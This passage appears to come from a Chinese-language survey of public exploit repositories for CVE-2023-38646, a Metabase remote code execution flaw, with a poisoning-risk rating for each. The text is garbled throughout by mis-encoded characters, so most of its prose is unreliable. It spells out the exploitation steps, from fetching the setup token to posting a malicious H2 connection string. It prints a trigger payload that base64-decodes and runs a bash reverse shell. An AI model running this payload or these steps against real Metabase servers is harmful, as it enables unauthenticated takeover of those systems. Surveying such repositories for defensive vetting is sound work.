    *   **è·å–Setup Tokenï¼š** é¦–å…ˆï¼Œ`CVE-2023-38646-POC.py` è„šæœ¬é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹æ¥è·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚è¯¥Tokenåœ¨åˆå§‹åŒ–è®¾ç½®é˜¶æ®µä½¿ç”¨ï¼Œæ˜¯åç»­åˆ©ç”¨çš„å…³é”®ã€‚
    *   **Reverse Shellåˆ©ç”¨ï¼š** `CVE-2023-38646-Reverse-Shell.py` è„šæœ¬åˆ©ç”¨è·å–çš„Setup Tokenï¼Œé€šè¿‡å‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå¹¶æ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå°†Payloadæ³¨å…¥åˆ°æ•°æ®åº“é…ç½®ä¸­ã€‚è¯¥Payloadä¼šæ‰§è¡Œä¸€ä¸ªåå‘Shellå‘½ä»¤ï¼Œè¿æ¥åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

2.  **æœ‰æ•ˆæ€§ï¼š**
    æ ¹æ®æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­æ­¤POC**æœ‰æ•ˆ**ã€‚å¤šä¸ªæ¥æºè¯å®äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œå¯åˆ©ç”¨æ€§ï¼Œå¹¶ä¸”æä¾›äº†å¯æ“ä½œçš„POCã€‚

3.  **æŠ•æ¯’é£é™©ï¼š**
    ä»£ç ä¸­å‘ç°çš„æ½œåœ¨æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦åˆ†æå¦‚ä¸‹ï¼š
    *   `CVE-2023-38646-POC.py` ä¸»è¦ç”¨äºè·å–Setup Tokenï¼ŒåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚
    *   `CVE-2023-38646-Reverse-Shell.py` çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨Setup Tokenæ‰§è¡ŒRCEï¼Œä½†æ˜¯æ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå‘è¿æ¥çš„IPå’Œç«¯å£ï¼Œå› æ­¤ä»£ç æœ¬èº«åªæ˜¯æä¾›äº†ä¸€ä¸ªæ¡†æ¶ã€‚é£é™©ç‚¹åœ¨äºå¦‚æœæ”»å‡»è€…ä¸å°å¿ƒä½¿ç”¨äº†é”™è¯¯çš„payloadï¼Œå¯èƒ½å¯¼è‡´ç›®æ ‡ç³»ç»Ÿå´©æºƒæˆ–å…¶ä»–å¼‚å¸¸ã€‚

   æ€»ä½“æ¥è¯´ï¼Œé£é™©ä¸»è¦é›†ä¸­åœ¨payloadçš„æ„å»ºå’Œæ‰§è¡Œä¸Šï¼Œè€Œéä»£ç æœ¬èº«å­˜åœ¨æ¶æ„æ³¨å…¥ã€‚ä½†ä¾æ—§éœ€è¦å¯¹ä¸‹è½½çš„è„šæœ¬è¿›è¡Œå…¨é¢çš„ä»£ç å®¡è®¡ã€‚


**é¡¹ç›®åœ°å€:** [asepsaepdin/CVE-2023-38646](https://github.com/asepsaepdin/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #19

**æ¥æº**: [CVE-2023-38646-birdm4nw_CVE-2023-38646.md](../2023/CVE-2023-38646-birdm4nw_CVE-2023-38646.md)

## CVE-2023-38646 - Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ), å…¶ä»–å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2.

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **è·å–setup-token:**  æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæå– `setup-token`ã€‚
2.  **æ„é€ æ¶æ„payload:**  æ„é€ åŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT` å‚æ•°å’Œ `CREATE TRIGGER` è¯­å¥ï¼Œåœ¨H2æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨æ¯æ¬¡ä» `INFORMATION_SCHEMA.TABLES` è¡¨ä¸­é€‰æ‹©æ•°æ®ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä¸­åŒ…å«çš„ Javascript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
3.  **å‘é€payload:**  å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  **æ‰§è¡Œå‘½ä»¤:**  Metabase å°è¯•ä½¿ç”¨æä¾›çš„æ•°æ®åº“è¿æ¥ï¼Œè§¦å‘æ¶æ„çš„ H2 è§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

è¯¥æ¼æ´åˆ©ç”¨ä»£ç é¦–å…ˆè·å–Metabaseçš„`setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªæ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œé€šè¿‡`TRACE_LEVEL_SYSTEM_OUT`å’Œ`CREATE TRIGGER`æœºåˆ¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç æ¥ç»•è¿‡ä¸€äº›è¿‡æ»¤ï¼Œå¹¶åœ¨payloadä¸­éšæœºç”Ÿæˆå­—ç¬¦ä¸²æ¥é¿å…ç¼“å­˜ç­‰é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¹¶æ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´è¿›è¡Œåå¼¹shellï¼Œè™½ç„¶åå¼¹shellæœ¬èº«å…·æœ‰ä¸€å®šçš„é£é™©ï¼Œä½†è¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ­£å¸¸è¡Œä¸ºï¼Œä¸åº”è§†ä¸ºæŠ•æ¯’ã€‚`README.md`æ–‡ä»¶ä¹Ÿæ²¡æœ‰ä»»ä½•å¯ç–‘ä¹‹å¤„ã€‚å¯ä»¥åˆ¤æ–­æ­¤ä»“åº“ä¸­ä½œè€…éšè—æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§å¾ˆä½ï¼Œæ¦‚ç‡ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [birdm4nw/CVE-2023-38646](https://github.com/birdm4nw/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #20

**æ¥æº**: [CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md](../2023/CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»æˆæƒçš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå­˜åœ¨æ¼æ´çš„Metabaseç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ¼æ´å­˜åœ¨äº Metabase çš„è®¾ç½®æµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒé€šè¿‡ä»¥ä¸‹æ­¥éª¤åˆ©ç”¨æ¼æ´ï¼š
1.  è·å– setup-token, ç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  æ„é€ åŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ POST è¯·æ±‚ï¼Œå‘é€åˆ° /api/setup/validate æ¥å£ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª SQL è§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® INFORMATION_SCHEMA.TABLES æ—¶æ‰§è¡Œä»»æ„çš„ base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  æ‰§è¡Œçš„å‘½ä»¤æ˜¯åå¼¹shellï¼Œå°†ç›®æ ‡æœåŠ¡å™¨çš„ shell é‡å®šå‘åˆ°æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©ï¼š**
ä»“åº“ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚ä¸»è¦é£é™©æ¥è‡ªäºï¼š
1.  `add_padding`å‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°çœ‹ä¼¼æ˜¯ä¸ºäº†æ¶ˆé™¤ base64 ç¼–ç åçš„ç­‰å·ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æ­¤å‡½æ•°æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œè™½ç„¶å½“å‰çš„ç›®çš„æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤æœºåˆ¶ï¼Œä½†å­˜åœ¨è¢«æ»¥ç”¨çš„é£é™©ï¼Œé€šè¿‡ä¿®æ”¹payloadæ„é€ è¿‡ç¨‹æ¤å…¥æ¶æ„ä»£ç ã€‚
2.  åå¼¹ Shell çš„IPå’Œç«¯å£æ˜¯ç”¨æˆ·æŒ‡å®šçš„ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…æ— æ³•é€šè¿‡ç›´æ¥ä¿®æ”¹ä»£ç æ¥æ¤å…¥åé—¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æ¼æ´å®šä½ï¼š** æ¼æ´å­˜åœ¨äºMetabaseçš„å®‰è£…è®¾ç½®é˜¶æ®µï¼Œå…·ä½“ä½äº`api/setup/validate`æ¥å£ã€‚
2.  **è·å–Tokenï¼š** é€šè¿‡è®¿é—®`/api/session/properties`è·å–`setup-token`ï¼Œè¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚
3.  **æ„é€ Payloadï¼š**  æ ¸å¿ƒåœ¨äºæ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä»¥ä¸‹å…³é”®éƒ¨åˆ†ï¼š
    *   `zip:/app/metabase.jar!/sample-database.db`ï¼šæŒ‡å®šæ•°æ®åº“æ–‡ä»¶çš„ä½ç½®ã€‚
    *   `MODE=MSSQLServer`ï¼šè®¾ç½®æ•°æ®åº“æ¨¡å¼ä¸ºMSSQLServerï¼Œè¿™æ˜¯è§¦å‘æ¼æ´çš„å¿…è¦æ¡ä»¶ã€‚
    *   `TRACE_LEVEL_SYSTEM_OUT=1`ï¼šå¯ç”¨ç³»ç»Ÿè¾“å‡ºè·Ÿè¸ªã€‚
    *   `CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x`ï¼šåˆ›å»ºä¸€ä¸ªåä¸º`pwnshell`çš„è§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢`INFORMATION_SCHEMA.TABLES`è¡¨ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä½¿ç”¨ JavaScript è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œåå¼¹shellå‘½ä»¤ã€‚`{payload}`ä¼šè¢«æ›¿æ¢ä¸ºbase64ç¼–ç åçš„åå¼¹shellå‘½ä»¤ï¼Œå…¶ä¸­åˆ©ç”¨äº†bashçš„ç‰¹æ€§è¿›è¡Œè§£ç å’Œæ‰§è¡Œã€‚
4.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ å¥½çš„åŒ…å«payloadçš„JSONæ•°æ®ï¼Œé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`æ¥å£ã€‚
5.  **æ‰§è¡Œå‘½ä»¤ï¼š**  å½“Metabaseå°è¯•è¿æ¥åˆ°æ¶æ„æ„é€ çš„æ•°æ®åº“æ—¶ï¼Œè§¦å‘å™¨è¢«æ‰§è¡Œï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [j0yb0y0h/CVE-2023-38646](https://github.com/j0yb0y0h/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #21

**æ¥æº**: [CVE-2023-38646-junnythemarksman_CVE-2023-38646.md](../2023/CVE-2023-38646-junnythemarksman_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­å­˜åœ¨çš„ä¸€ä¸ªæ— éœ€è®¤è¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹åˆ¶çš„ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨ `subname` å­—æ®µä¸­æ³¨å…¥æ¶æ„çš„ JDBC URLã€‚è¯¥URLåŒ…å«ä¸€ä¸ªCREATE TRIGGERè¯­å¥ï¼Œè¯¥è¯­å¥åœ¨INFORMATION_SCHEMA.TABLESè¡¨ä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æä¾›ä¸€ä¸ªåŒ…å«åå¼¹shellå‘½ä»¤çš„payloadï¼Œè¯¥å‘½ä»¤ä¼šè¢«base64ç¼–ç åæ‰§è¡Œã€‚æ¼æ´åˆ©ç”¨ä»£ç ä¸­çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¸»è¦æ˜¯é€šè¿‡ç¯¡æ”¹IPå’Œç«¯å£è¿›è¡Œæ¶æ„è¿æ¥ï¼Œå­˜åœ¨å°‘é‡é£é™©ã€‚ è„šæœ¬è¦æ±‚ç”¨æˆ·æŒ‡å®šç›®æ ‡ URL å’Œ tokenï¼Œ token é€šè¿‡ `/api/session/properties` è·å–ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  è·å–ç›®æ ‡ Metabase å®ä¾‹çš„ URL å’Œ tokenï¼ˆé€šè¿‡è®¿é—® `/api/session/properties` è·å–ï¼‰ã€‚
2.  é…ç½®æ¼æ´åˆ©ç”¨è„šæœ¬ `exploit.py`ï¼Œè®¾ç½®ç›®æ ‡ URLã€tokenã€æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚
3.  è¿è¡Œè„šæœ¬ï¼Œè„šæœ¬å°†å‘é€åŒ…å«æ¶æ„ JDBC URL çš„ POST è¯·æ±‚åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚
4.  ç›®æ ‡ Metabase å®ä¾‹æ‰§è¡Œæ¶æ„ä»£ç ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å’Œå‘é€æ¶æ„è¯·æ±‚ï¼Œè™½ç„¶å­˜åœ¨é€šè¿‡ä¿®æ”¹IPç«¯å£è¿›è¡Œæ¶æ„è¿æ¥çš„é£é™©ï¼Œ ä½†æ˜¯éœ€è¦ä½¿ç”¨è€…è‡ªè¡Œé…ç½®ã€‚æ‰€ä»¥æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [junnythemarksman/CVE-2023-38646](https://github.com/junnythemarksman/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #22

**æ¥æº**: [CVE-2023-38646-kh4sh3i_CVE-2023-38646.md](../2023/CVE-2023-38646-kh4sh3i_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseçš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå­˜åœ¨äº0.46.6.1ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ1.46.6.1ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ä¸­ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„HTTPè¯·æ±‚åˆ°/api/setup/validateç«¯ç‚¹ï¼Œå…¶ä¸­åŒ…å«æ¶æ„æ„é€ çš„JSON payloadã€‚è¯¥payloadåˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE ALIAS`è¯­å¥åˆ›å»ºä¸€ä¸ªåä¸º`SHELLEXEC`çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚PoCä»£ç é€šè¿‡curlå‘½ä»¤å›è¿æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ŒéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚è™½ç„¶POCä¸­ä½¿ç”¨äº†curlè¿›è¡Œå›è¿ï¼Œä½†æ”»å‡»è€…å¯ä»¥æ›¿æ¢æˆä»»ä½•å‘½ä»¤è¿›è¡Œæ¶æ„åˆ©ç”¨ã€‚æŠ•æ¯’é£é™©è¾ƒä½ï¼Œåªæœ‰æå°çš„å¯èƒ½æ€§ä½œè€…åœ¨ä»£ç ä¸­æ¤å…¥å…¶ä»–æ¶æ„ä»£ç ï¼ˆæ¯”å¦‚åœ¨LICENSEæ–‡ä»¶ä¸­éšè—ä¸å¯è§å­—ç¬¦ï¼‰ï¼Œä½†è¿™å¯ä»¥é€šè¿‡ä»”ç»†å®¡æŸ¥ä»£ç æ¥é¿å…ã€‚PoCä»£ç ä¸»è¦é€šè¿‡H2æ•°æ®åº“çš„ç‰¹æ€§æ‰§è¡Œä»»æ„ä»£ç ï¼ŒLICENSEæ–‡ä»¶ä¸»è¦å£°æ˜äº†ç‰ˆæƒåè®®ã€‚

**é¡¹ç›®åœ°å€:** [kh4sh3i/CVE-2023-38646](https://github.com/kh4sh3i/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #23

**æ¥æº**: [CVE-2023-38646-nickswink_CVE-2023-38646.md](../2023/CVE-2023-38646-nickswink_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚å¤šä¸ªèµ„æºç¡®è®¤äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œä¸¥é‡æ€§ã€‚

æä¾›çš„ PoC ä»£ç  `exploit.py` å°è¯•åˆ©ç”¨æ­¤æ¼æ´ã€‚å®ƒé¦–å…ˆè·å– Metabase å®ä¾‹çš„ `setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚Payloadä½¿ç”¨base64ç¼–ç åå¼¹shellå‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š**  PoC è„šæœ¬é¦–å…ˆå‘ç›®æ ‡ Metabase å®ä¾‹çš„ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œè§£æè¿”å›çš„ JSON æ•°æ®ä»¥æå– `setup-token`ã€‚æ­¤ token ç”¨äºåç»­çš„æ¼æ´åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š**  è¯¥è„šæœ¬æ„é€ ä¸€ä¸ª JSON payloadï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT=1` å’Œ `CREATE TRIGGER` ç­‰ H2 ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  **å‘é€ Payloadï¼š**  è„šæœ¬å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨åï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ payload ä¸­çš„å‘½ä»¤ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…çš„æœºå™¨ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

PoC ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå¹¶æ— æ˜æ˜¾çš„æ¶æ„æŠ•æ¯’ä»£ç ï¼Œä½†æ˜¯ä»å­˜åœ¨ä¸€å®šçš„é£é™©, å› ä¸ºPoC æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥æ›¿æ¢åå¼¹shellçš„payloadä¸ºæ¶æ„payload,ä¾‹å¦‚åˆ é™¤æœåŠ¡å™¨æ•°æ®ï¼Œå› æ­¤æŠ•æ¯’é£é™©å­˜åœ¨ï¼Œé¢„ä¼°æ¯”ä¾‹ä¸º5%ã€‚æ­¤è¯„ä¼°åŸºäºä»£ç æœ¬èº«ï¼Œä¸åŒ…æ‹¬ä»£ç æ‰˜ç®¡å¹³å°å¯èƒ½å­˜åœ¨çš„é£é™©ï¼Œå¦‚è´¦å·è¢«ç›—ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [nickswink/CVE-2023-38646](https://github.com/nickswink/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #24

**æ¥æº**: [CVE-2023-38646-passwa11_CVE-2023-38646.md](../2023/CVE-2023-38646-passwa11_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

